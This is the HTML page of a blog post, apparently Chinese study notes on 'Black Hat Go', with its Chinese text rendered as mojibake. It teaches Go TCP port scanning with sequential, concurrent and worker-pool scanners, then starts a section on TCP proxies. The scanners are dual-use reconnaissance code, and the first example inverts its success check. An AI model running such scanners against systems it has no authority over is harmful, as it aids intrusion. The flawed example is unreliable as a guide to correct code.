<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TCPã€æ‰«æå™¨å’Œä»£ç† | N3bu74&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Goé»‘å¸½å­æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ä¸€ä¹‹TCPã€æ‰«æå™¨å’Œä»£ç†">
<meta name="author" content="
ğŸ™â€â™‚ï¸&nbsp;N3bu74">
<link rel="canonical" href="https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f5f7976b0695bcc912cd3f9e0715cf7d38944601dc8250a8f2f117625f16e974.css" integrity="sha256-9feXawaVvMkSzT&#43;eBxXPfTiURgHcglCo8vEXYl8W6XQ=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
        onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="apple-touch-icon" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="mask-icon" href="https://n3bu74.github.io/img/N3bu74.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>




<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = ""; 
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<meta property="og:title" content="TCPã€æ‰«æå™¨å’Œä»£ç†" />
<meta property="og:description" content="Goé»‘å¸½å­æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ä¸€ä¹‹TCPã€æ‰«æå™¨å’Œä»£ç†" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-03T12:07:44+08:00" />
<meta property="article:modified_time" content="2023-02-03T12:07:44+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="TCPã€æ‰«æå™¨å’Œä»£ç†"/>
<meta name="twitter:description" content="Goé»‘å¸½å­æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ä¸€ä¹‹TCPã€æ‰«æå™¨å’Œä»£ç†"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [

        {
          "@type": "ListItem",
          "position":  2 ,
          "name": "ğŸ“šæ–‡ç« ",
          "item": "https://n3bu74.github.io/posts/"
        },

        {
          "@type": "ListItem",
          "position":  3 ,
          "name": "ğŸ’» å®‰å…¨",
          "item": "https://n3bu74.github.io/posts/sec/"
        }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "TCPã€æ‰«æå™¨å’Œä»£ç†",
      "item": "https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TCPã€æ‰«æå™¨å’Œä»£ç†",
  "name": "TCPã€æ‰«æå™¨å’Œä»£ç†",
  "description": "Goé»‘å¸½å­æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ä¸€ä¹‹TCPã€æ‰«æå™¨å’Œä»£ç†",
  "keywords": [
    ""
  ],
  "articleBody": "1.TCPæ‰«æ 1.0 TCPæ¡æ‰‹æœºåˆ¶ TCPä¸­æœ€é‡è¦çš„ä¸€ç‚¹å³ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ‰€è°“tcpå…¨è¿æ¥æ‰«æï¼ŒtcpåŠè¿æ¥æ‰«æç­‰éƒ½æ˜¯ä¾æ®ä¸‰æ¬¡æ¡æ‰‹çš„åŸºç¡€è¿›è¡Œçš„ï¼Œåªä¸è¿‡æ˜¯åœ¨æ¡æ‰‹çš„æ¬¡æ•°ä¸Šæœ‰åŒºåˆ«ã€‚ç®€å•æ¥è¯´ä¸‰æ¬¡æ¡æ‰‹åˆ†ä¸ºä¸‹é¢ä¸‰æ­¥ï¼š\nç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€synåŒ…ï¼Œè¡¨ç¤ºé€šä¿¡å¼€å§‹\nç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯å›å¤syn-ackä½œä¸ºç›¸åº”ï¼Œæç¤ºå®¢æˆ·ç«¯ä»¥ackç»“æŸ\nç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ackï¼Œé€šä¿¡å¼€å§‹\n1.å¦‚æœç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œåˆ™ä¼šè¿›è¡Œ3æ¬¡æ¡æ‰‹ã€‚é¦–å…ˆï¼Œå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªsynæ•°æ®åŒ…ï¼Œè¯¥æ•°æ®åŒ…è¡¨ç¤ºé€šä¿¡å¼€å§‹;ç„¶åï¼ŒæœåŠ¡å™¨ä»¥syn-ackè¿›è¡Œå“åº”ï¼Œæç¤ºå®¢æˆ·ç«¯ä»¥ackä½œä¸ºç»“æŸ;ä¹‹åå°±å¯ä»¥è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚\n2.å¦‚æœç«¯å£å…³é—­ï¼Œåˆ™æœåŠ¡å™¨ä¼šä»¥ä¸€ä¸ªrstæ•°æ®åŒ…è€Œä¸æ˜¯syn-ackè¿›è¡Œå“åº”ã€‚\n3.å¦‚æœæµé‡è¢«é˜²ç«å¢™è¿‡æ»¤ï¼Œåˆ™å®¢æˆ·ç«¯é€šå¸¸ä¸ä¼šä»æœåŠ¡å™¨æ”¶åˆ°ä»»ä½•å“åº”ã€‚\n1.1 å•ä¸ªç«¯å£æ‰«æ package main import ( \"fmt\" \"net\" ) func main() { _, err := net.Dial(\"tcp\", \"www.baidu.com:80\") if err != nil { fmt.Println(\"Connection successful\") } else { fmt.Println(\"Connection failed\") } } æˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ˜¯Goçš„netåŒ…ï¼š Dial(network string, address string) (Conn, error)ã€‚\nç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºæ ‡è¯†è¦å¯åŠ¨çš„è¿æ¥çš„ç±»å‹ã€‚å¯ä»¥æ˜¯TCPã€UNIXå¥—æ¥å­—ã€UDPå’Œç¬¬4å±‚åè®®çš„è¿æ¥ã€‚\nç¬¬äºŒä¸ªå‚æ•°æ˜¯å‘Šè¯‰ Dialå‡½æ•° ä½ æƒ³è¦è¿æ¥çš„ä¸»æœºã€‚å¯¹äº IPv4/TCPè¿æ¥ï¼Œæ­¤å­—ç¬¦ä¸²å°†ä½¿ç”¨ host:port çš„å½¢å¼ã€‚\nåˆ¤æ–­æ˜¯å¦è¿æ¥æˆåŠŸï¼šDial(network,address stringï¼‰è¿”å› Con å’Œ error ,å¦‚æœè¿æ¥æˆåŠŸ, error å°†ä¸º nilã€‚å› æ­¤,è¦éªŒè¯è¿æ¥,åªéœ€è¦æ£€æŸ¥ erroræ˜¯å¦ç­‰äºnil.\n1.2 éå¹¶å‘æ‰«æ å½“æˆ‘ä»¬è¦å¯¹å¤šä¸ªç«¯å£æ‰«ææ—¶ï¼Œå°±è¦å¯¹ç«¯å£è¿›è¡Œæšä¸¾å¹¶æ‹¼æ¥åˆ° addressä¸­ï¼Œè¿™é‡Œå°±è¦å°†æ•´æ•°è½¬æ¢æˆå­—ç¬¦ä¸²å¹¶æ‹¼æ¥ï¼Œæˆ–è€…ç›´æ¥æ ¼å¼åŒ–è¾“å‡ºã€‚\npackage main import ( \"fmt\" \"net\" ) func main() { for i := 1; i \u003c= 1024; i++ { address := fmt.Sprintf(\"127.0.0.1:%d\", i) conn, err := net.Dial(\"tcp\", address) if err != nil { fmt.Printf(\"Connect port:%d failed\\n\", i) continue } conn.Close() fmt.Printf(\"port:%d Open\\n\", i) } } 1.3 å¹¶å‘æ‰«æ ä»ä¸Šä¾‹æ‰«æå¯çŸ¥ï¼Œæ‰«æé€Ÿåº¦ç‰¹æ…¢ï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–å¹¶å‘æ“ä½œã€‚\npackage main import ( \"fmt\" \"net\" ) func main() { for i := 1; i \u003c= 1024; i++ { go func(j int) { address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(i) } } ä½†æ˜¯è¿™é‡Œå¦‚æœ ç›´æ¥ä½¿ç”¨ go å…³é”®å­—ï¼Œä¼šä¸ºæ¯ä¸ªè¿æ¥å¯åŠ¨ä¸€ä¸ª goroutine è€Œä¸» goroutine å¹¶ä¸çŸ¥é“è¦ç­‰å¾…è¿æ¥å‘ç”Ÿã€‚å› æ­¤ï¼Œä»£ç ä¼šåœ¨forå¾ªç¯å®Œæˆå…¶è¿­ä»£åç«‹å³å®Œæˆå¹¶é€€å‡ºï¼Œè¿™å¯èƒ½æ¯”ä»£ç ä¸ç›®æ ‡ç«¯å£ä¹‹é—´çš„æ•°æ®åŒ…ç½‘ç»œäº¤æ¢è¿˜è¦å¿«ã€‚å¯¹äºæ•°æ®åŒ…ä»åœ¨è¿è¡Œä¸­çš„ç«¯å£ï¼Œå¯èƒ½æ— æ³•è·å¾—å…¶å‡†ç¡®çš„ç»“æœï¼Œå› æ­¤æˆ‘ä»¬å¾—é‡‡å–ä¸€äº›æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n1.3.1 ä½¿ç”¨ WaitGroup è¿›è¡ŒåŒæ­¥æ‰«æ package main import ( \"fmt\" \"net\" \"sync\" \"time\" ) func main() { t := time.Now() var wg sync.WaitGroup for i := 1; i \u003c= 1024; i++ { wg.Add(1) go func(j int) { defer wg.Done() address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(i) } wg.Wait() fmt.Println(time.Since(t)) } è¯¥ç¨‹åºæ¯”åˆå§‹ç‰ˆæœ¬æœ‰äº†è¿›æ­¥ï¼Œä½†ä»ç„¶ä¸ç®—æ˜¯æ­£ç¡®çš„ã€‚å¦‚æœå¯¹å¤šä¸ªä¸»æœºå¤šæ¬¡æ‰§è¡Œæ­¤ç¨‹åºï¼Œåˆ™å¯èƒ½ä¼šçœ‹åˆ°ä¸ä¸€è‡´çš„ç»“æœã€‚åŒæ—¶æ‰«æè¿‡å¤šçš„ä¸»æœºæˆ–ç«¯å£å¯èƒ½ä¼šå¯¼è‡´ç½‘ç»œæˆ–ç³»ç»Ÿé™åˆ¶ï¼Œé€ æˆç»“æœä¸æ­£ç¡®ã€‚ä½ å¯ä»¥å°è¯•å°† 1024 æ›´æ”¹ä¸º 65535 å¹¶å°†ç›®æ ‡æœåŠ¡å™¨æ›´æ”¹ä¸ºæœ¬åœ°ä¸»æœº l27.0.0.1 ï¼Œç»“æœå¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯ã€‚å¦‚æœ‰éœ€è¦ï¼Œå¯ä»¥ä½¿ç”¨Wiresharkæˆ–tcpdumpæŸ¥çœ‹æ‰“å¼€è¿™äº›è¿æ¥çš„é€Ÿåº¦ã€‚\n1.3.2 ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ 1.3.2.1 å•é€šé“é€šä¿¡ ä¸ºé¿å…ç»“æœä¸ä¸€è‡´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ goroutine æ± ç®¡ç†æ­£åœ¨è¿›è¡Œçš„å¹¶å‘å·¥ä½œã€‚ä½¿ç”¨ for å¾ªç¯åˆ›å»ºä¸€å®šæ•°é‡çš„å·¥äºº goroutine ä½œä¸ºèµ„æºæ± ï¼›ç„¶åï¼Œåœ¨ main() çº¿ç¨‹ä¸­ä½¿ç”¨é€šé“æä¾›å·¥ä½œã€‚\né¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°ç¨‹åºï¼Œè¯¥ç¨‹åºæœ‰ l00 ä¸ª worker ,ä½¿ç”¨ä¸€ä¸ª int é€šé“å°†å®ƒä»¬æ‰“å°åˆ°å±å¹•ä¸Šã€‚ç»§ç»­ä½¿ç”¨ WaitGroup é˜»å¡æ‰§è¡Œã€‚\nå‡½æ•° worker(ports chan int, * sync.WaitGroup) æœ‰ä¸¤ä¸ªå‚æ•°ï¼šint ç±»å‹çš„é€šé“å’ŒæŒ‡å‘ WaitGroup çš„æŒ‡é’ˆã€‚é€šé“ç”¨äºæ¥æ”¶å·¥ä½œï¼Œè€ŒWaitGroupåˆ™ç”¨äºè·Ÿè¸ªå•ä¸ªå·¥ä½œçš„å®Œæˆæƒ…å†µã€‚\npackage main import ( \"fmt\" \"sync\" ) func worker(ports chan int, wg *sync.WaitGroup) { for p := range ports { fmt.Println(p) wg.Done() } } func main() { ports := make(chan int, 100) // make ä¸€ä¸ªå®¹é‡ä¸º 100 çš„ç¼“å†²é€šé“ var wg sync.WaitGroup for i := 0; i \u003c cap(ports); i++ { //å¯åŠ¨æ‰€éœ€æ•°é‡çš„å·¥äººçº¿ç¨‹,ä½†è¿™æ—¶å·¥äººå°šæœªå·¥ä½œ go worker(ports, \u0026wg) } for i := 1; i \u003c= 1024; i++ { // éå†ç«¯å£é€å…¥é€šé“ ports ä¸­ wg.Add(1) ports \u003c- i } wg.Wait() close(ports) } é¦–å…ˆ make ä¸€ä¸ªå®¹é‡ä¸º 100 çš„ç¼“å†²é€šé“ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸ç­‰å¾…æ¥æ”¶å™¨è¯»å–æ•°æ®çš„æƒ…å†µä¸‹å‘å…¶å‘é€æ•°æ®ï¼ŒåŒæ—¶ç¼“å†²é€šé“ä¹Ÿå¯ä»¥å¾ˆå¥½åœ°ç”¨æ¥ç»´æŠ¤å’Œè·Ÿè¸ªå¤šä¸ªç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„å·¥ä½œã€‚\næ¥ä¸‹æ¥ï¼Œä½¿ç”¨ for å¾ªç¯å¯åŠ¨æ‰€éœ€æ•°é‡çš„å·¥äººçº¿ç¨‹ï¼Œåœ¨å‡½æ•° worker(ports chan int, * sync.WaitGroup)ä¸­ï¼Œä½¿ç”¨ range è¿ç»­åœ°ä»é€šé“ ports æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°è¯¥é€šé“è¢«å…³é—­ã€‚æ³¨æ„ï¼Œè¿™æ—¶å·¥äººå°šæœªå¼€å§‹ä»»ä½•å·¥ä½œã€‚åœ¨å‡½æ•° main() ä¸­ä¾æ¬¡éå†è¦æ‰«æçš„ç«¯å£é€å…¥é€šé“ ports ä¸­,ç„¶åå°†é€šé“ ports ä¸­çš„ä¸€ä¸ªç«¯å£å‘é€ç»™å·¥äººã€‚å®Œæˆæ‰€æœ‰å·¥ä½œåï¼Œå…³é—­é€šé“ ã€close(ports)ã€‘ã€‚\nç¼–å†™å¹¶æ‰§è¡Œè¯¥ç¨‹åºåï¼Œä½ ä¼šåœ¨å±å¹•ä¸Šçœ‹åˆ°ç›¸åº”çš„æ•°å­—ã€‚ä¸è¿‡ï¼Œä½ å¯èƒ½ä¼šæ³¨æ„åˆ°ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼šæ•°å­—ä¸æ˜¯ä»¥ç‰¹å®šçš„é¡ºåºæ‰“å°çš„ã€‚æ¬¢è¿æ¥åˆ°ç²¾å½©çš„å¹¶è¡Œä¸–ç•Œã€‚\nç»“åˆç«¯å£æ‰«æï¼š\npackage main import ( \"fmt\" \"net\" \"sync\" ) func worker(ports chan int, wg *sync.WaitGroup) { for p := range ports { go func(j int) { defer wg.Done() address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(p) } } func main() { ports := make(chan int, 100) var wg sync.WaitGroup for i := 0; i \u003c cap(ports); i++ { go worker(ports, \u0026wg) } for i := 1; i \u003c= 1024; i++ { wg.Add(1) ports \u003c- i } wg.Wait() close(ports) } è¿™æ ·å¹¶å‘ç«¯å£æ‰«æå™¨å°±å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯ï¼Œæ‰“å°åˆ°å±å¹•çš„ç«¯å£å°†æ— æ³•æ’åºï¼Œå› ä¸ºè¯¥ç«¯å£æ‰«æå™¨ä¸ä¼šæ£€æŸ¥å®ƒä»¬çš„é¡ºåºã€‚\n1.3.2.2 å¤šé€šé“é€šä¿¡ è¦è§£å†³ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œä½ éœ€è¦ä½¿ç”¨å•ç‹¬çš„çº¿ç¨‹å°†ç«¯å£æ‰«æçš„ç»“æœä¼ å›ä¸»çº¿ç¨‹ï¼Œä»¥ä¾¿åœ¨æ‰“å°ä¹‹å‰å¯¹ç«¯å£è¿›è¡Œæ’åºã€‚è¿™æ ·ä¿®æ”¹çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå¯ä»¥å®Œå…¨æ¶ˆé™¤å¯¹ WaitGroup çš„ä¾èµ–ï¼Œå› ä¸ºæˆ‘ä»¬å°†ä½¿ç”¨å¦ä¸€ç§è·Ÿè¸ªå®Œæˆæƒ…å†µçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‰«æ1024ä¸ªç«¯å£ï¼Œåˆ™è¦åœ¨å·¥äººé€šé“ä¸Šå‘é€1024æ¬¡ï¼Œå¹¶ä¸”éœ€è¦å°†è¯¥å·¥ä½œçš„ç»“æœå‘é€å›ä¸»çº¿ç¨‹1024æ¬¡ã€‚ç”±äºå‘é€çš„å·¥ä½œå•å…ƒæ•°é‡å’Œæ”¶åˆ°çš„ç»“æœæ•°é‡ç›¸åŒï¼Œå› æ­¤ç¨‹åºå¯ä»¥çŸ¥é“ä½•æ—¶å…³é—­é€šé“å¹¶éšåå…³é—­å·¥äººçº¿ç¨‹ã€‚\npackage main import ( \"fmt\" \"net\" \"sort\" ) func worker(ports, results chan int) { for p := range ports { address := fmt.Sprintf(\"127.0.0.1:%d\", p) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) results \u003c- 0 continue } conn.Close() results \u003c- p } } func main() { ports := make(chan int, 100) results := make(chan int) var openports []int for i := 0; i \u003c cap(ports); i++ { go worker(ports, results) } go func() { for i := 1; i \u003c= 1024; i++ { ports \u003c- i } }() for i := 1; i \u003c= 1024; i++ { port := \u003c-results if port != 0 { openports = append(openports, port) } } close(ports) close(results) sort.Ints(openports) for _, port := range openports { fmt.Printf(\"port:%d Open\\n\", port) } } ä¿®æ”¹å‡½æ•° worker(ports,.results chan int) ä»¥æ¥å—ä¸¤ä¸ªé€šé“ã€‚å…¶ä½™é€»è¾‘åŸºæœ¬ç›¸åŒï¼Œä¸åŒä¹‹å¤„åœ¨äºï¼šå¦‚æœç«¯å£å…³é—­ï¼Œåˆ™å°†å‘é€ä¸€ä¸ª 0 ï¼›å¦‚æœç«¯å£å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œåˆ™å°†å‘é€ç«¯å£å·ã€‚å¦å¤–ï¼Œåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„é€šé“ç”¨äºå°†ç»“æœä»å·¥äººç¨‹åºä¼ é€’åˆ°ä¸»çº¿ç¨‹ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡ï¼Œå­˜å‚¨ç»“æœï¼Œä»¥ä¾¿ä»¥åè¿›è¡Œæ’åºã€‚æ¥ä¸‹æ¥ï¼Œéœ€è¦å•ç‹¬ä½¿ç”¨ä¸€ä¸ª goroutine æŠŠéœ€è¦æ¢æµ‹çš„ç«¯å£å·å‘é€ç»™å·¥äººï¼Œå› ä¸ºå·¥äººéœ€è¦åœ¨ç»“æœæ”¶é›†å¾ªç¯å‰å¼€å§‹å·¥ä½œã€‚\nç»“æœæ”¶é›†å¾ªç¯åœ¨ results é€šé“ä¸Šæ¥æ”¶ 1024 æ¬¡ã€‚å¦‚æœç»“æœä¸ç­‰äº 0 ï¼Œåˆ™ä¼šå°†å…¶è¿½åŠ åˆ°åˆ‡ç‰‡ã€‚å…³é—­é€šé“åï¼Œä½¿ç”¨ sort å¯¹å­˜å‚¨æ‰“å¼€ç«¯å£çš„åˆ‡ç‰‡è¿›è¡Œæ’åºã€‚å‰©ä¸‹çš„å°±æ˜¯å¾ªç¯åˆ‡ç‰‡å¹¶å°†æ‰“å¼€çš„ç«¯å£æ‰“å°åˆ°å±å¹•ä¸Šã€‚\nä¸€ä¸ªé«˜æ•ˆçš„ç«¯å£æ‰«æå™¨å°±æ­¤å®ç°ã€‚èŠ±ä¸€äº›æ—¶é—´å¤„ç†ä»£ç ï¼Œå°¤å…¶æ˜¯å·¥äººçš„æ•°é‡ã€‚å·¥äººçš„æ•°é‡è¶Šå¤šï¼Œç¨‹åºåº”æ‰§è¡Œå¾—è¶Šå¿«ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ·»åŠ è¿‡å¤šçš„å·¥äººï¼Œç»“æœå°±å¯èƒ½ä¼šå˜å¾—ä¸å¯é ã€‚å½“ç¼–å†™ä¾›å…¶ä»–äººä½¿ç”¨çš„å·¥å…·æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåˆç†çš„é»˜è®¤å€¼ï¼Œä»¥ç¡®ä¿ç»“æœçš„å¯é æ€§ã€‚ä¸è¿‡ï¼Œä½ è¿˜åº”å…è®¸ç”¨æˆ·é€‰æ‹©å·¥äººçš„æ•°é‡ã€‚\nä½ å¯ä»¥å¯¹è¯¥ç¨‹åºè¿›è¡Œä¸€äº›æ”¹è¿›ã€‚é¦–å…ˆï¼Œä¸ºæ‰«æçš„æ¯ä¸ªç«¯å£å‘é€ results é€šé“ï¼Œä½†ä½ ä¸å¿…éå¾—è¿™ä¹ˆåšï¼›ä½ è¿˜å¯ä»¥æŠŠä»£ç å†™å¾—å¤æ‚ä¸€ç‚¹ï¼Œå› ä¸ºå®ƒä½¿ç”¨é™„åŠ é€šé“ä¸ä»…æ˜¯ä¸ºäº†è·Ÿè¸ªå·¥äººï¼Œè€Œä¸”ä¸ºäº†èƒ½é€šè¿‡ç¡®ä¿æ‰€æœ‰ç»“æœæ”¶é›†çš„å®Œæˆæ¥é˜²æ­¢å‡ºç°ç«æ€æ¡ä»¶ã€‚å› ä¸ºè¿™æ˜¯ä»‹ç»æ€§çš„ä¸€ç« ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰æ„çœç•¥äº†è¿™äº›å†…å®¹ã€‚ä¸è¿‡ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘ä»¬å°†åœ¨ç¬¬3ç« ä¸­ä»‹ç»è¿™ç§æ¨¡å¼ã€‚å…¶æ¬¡ï¼Œä½ å¯èƒ½å¸Œæœ›æ‰«æå™¨èƒ½å¤Ÿè§£æç«¯å£å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚80ã€443ã€8080ã€21-25ã€‚å¦‚æœè¦æŸ¥çœ‹å…¶å®ç°ï¼Œè¯·å‚è§https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/ã€‚æˆ‘ä»¬å°†å…¶ä½œä¸ºç»ƒä¹ ä¾›è¯»è€…æ¢ç´¢ã€‚\npackage portformat import ( \"errors\" \"strconv\" \"strings\" ) const ( porterrmsg = \"Invalid port specification\" ) // å¤„ç† 1-65535 ç±»å‹ï¼Œé€ä¸ªæ·»åŠ åˆ°æ‰«æçš„ç«¯å£åˆ‡ç‰‡ä¸­ func dashSplit(sp string, ports *[]int) error { dp := strings.Split(sp, \"-\") if len(dp) != 2 { return errors.New(porterrmsg) } start, err := strconv.Atoi(dp[0]) if err != nil { return errors.New(porterrmsg) } end, err := strconv.Atoi(dp[1]) if err != nil { return errors.New(porterrmsg) } if start \u003e end || start \u003c 1 || end \u003e 65535 { return errors.New(porterrmsg) } for ; start \u003c= end; start++ { *ports = append(*ports, start) } return nil } // å°†ç«¯å£å­—ç¬¦ä¸²è½¬æ¢æˆ int ç±»å‹ï¼Œå¹¶æ·»åŠ åˆ°è¦æ‰«æçš„ç«¯å£åˆ‡ç‰‡ä¸­ func convertAndAddPort(p string, ports *[]int) error { i, err := strconv.Atoi(p) if err != nil { return errors.New(porterrmsg) } if i \u003c 1 || i \u003e 65535 { return errors.New(porterrmsg) } *ports = append(*ports, i) return nil } // Parse turns a string of ports separated by '-' or ',' and returns a slice of Ints. func Parse(s string) ([]int, error) { ports := []int{} if strings.Contains(s, \",\") \u0026\u0026 strings.Contains(s, \"-\") { sp := strings.Split(s, \",\") for _, p := range sp { if strings.Contains(p, \"-\") { if err := dashSplit(p, \u0026ports); err != nil { return ports, err } } else { if err := convertAndAddPort(p, \u0026ports); err != nil { return ports, err } } } } else if strings.Contains(s, \",\") { sp := strings.Split(s, \",\") for _, p := range sp { convertAndAddPort(p, \u0026ports) } } else if strings.Contains(s, \"-\") { if err := dashSplit(s, \u0026ports); err != nil { return ports, err } } else { if err := convertAndAddPort(s, \u0026ports); err != nil { return ports, err } } return ports, nil } 2.æ„é€ TCPä»£ç† ä¸Šä¸€èŠ‚ä¸»è¦ä»‹ç»å¦‚ä½•ä»å®¢æˆ·ç«¯çš„è§’åº¦ä½¿ç”¨netåŒ…ï¼Œè€Œæœ¬èŠ‚å°†ä»‹ç»ä½¿ç”¨å®ƒåˆ›å»ºTCPæœåŠ¡å™¨å’Œä¼ è¾“æ•°æ®çš„æ–¹æ³•ã€‚ æˆ‘ä»¬å°†é¦–å…ˆä»‹ç»å¦‚ä½•æ„å»ºå¿…è¦çš„å›æ˜¾æœåŠ¡å™¨ï¼ˆè¯¥æœåŠ¡å™¨ä»…å›æ˜¾ç»™å®šå“åº”åˆ°å®¢æˆ·ç«¯ï¼‰ï¼Œä¹‹åå°†ä»‹ç»æœ‰å…³ä¸¤ä¸ªè¾ƒä¸ºé€šç”¨çš„ç¨‹åºçš„çŸ¥è¯†ï¼Œå³å¦‚ä½•åˆ›å»ºTCPç«¯å£è½¬å‘å™¨ä»¥åŠå¦‚ä½•é‡æ–°åˆ›å»ºNetcatçš„â€œå®‰å…¨å·¨æ´â€ç”¨äºè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚\n2.1 ä½¿ç”¨ io.Reader å’Œ io.Writer è¦åˆ›å»ºæœ¬èŠ‚ä¸­çš„ç¤ºä¾‹ï¼Œæ— è®ºä½ ä½¿ç”¨çš„æ˜¯TCPã€HTTPã€æ–‡ä»¶ç³»ç»Ÿè¿˜æ˜¯ä»»ä½•å…¶ä»–æ–¹å¼ï¼Œéƒ½éœ€è¦ä½¿ç”¨ä¸¤ç§ç±»å‹ï¼šio.Reader å’Œ io.Writer ã€‚å¯¹äºæ‰€æœ‰è¾“å…¥/è¾“å‡º(I/O)ä»»åŠ¡æ¥è¯´ï¼Œè¿™ä¸¤ç§æ•°æ®ç±»å‹éƒ½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚å®ƒä»¬æ˜¯ Go å†…ç½® io åŒ…çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯æ‰€æœ‰æœ¬åœ°æˆ–ç½‘ç»œæ•°æ®ä¼ è¾“çš„åŸºç¡€ã€‚è¿™ä¸¤ç§æ•°æ®ç±»å‹åœ¨ Go çš„æ–‡æ¡£ä¸­å®šä¹‰å¦‚ä¸‹ã€‚\ntype Reader interface { Read(p []byte) (n int, err error) } type Writer interface { Write(p []byte) (n int, err error) } ä»¥ä¸Šä¸¤ç§æ•°æ®ç±»å‹éƒ½è¢«å®šä¹‰ä¸ºæ¥å£ï¼Œè¿™æ„å‘³ç€å®ƒä»¬ä¸èƒ½ç›´æ¥è¢«å®ä¾‹åŒ–ã€‚è€Œæ˜¯æœ‰ æŸç§æ•°æ®ç±»å‹å®ç°ä¸Šè¿°çš„ Read æˆ– Write æ–¹æ³•ï¼Œè¯¥ Read æˆ– Write 